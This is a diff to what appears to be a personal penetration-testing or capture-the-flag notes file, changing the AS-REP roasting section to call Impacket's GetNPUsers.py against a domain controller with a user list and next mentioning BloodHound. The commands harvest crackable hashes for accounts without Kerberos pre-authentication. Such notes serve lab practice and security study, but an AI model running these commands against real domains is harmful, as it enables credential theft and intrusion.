@@ -20,7 +20,8 @@ AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authe
 
  EXPLOITING:
 - put all user's in a file names `users.txt`
-- `for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip $IP htb/${user} | grep -v Impacket; done` GetNPUsers is in impacket
+- `GetNPUsers.py $DOMAIN -dc-ip $IP -usersfile users.txt`
+GetNPUsers is in impacket
 
 ### BloodHound
 starting BloodHound
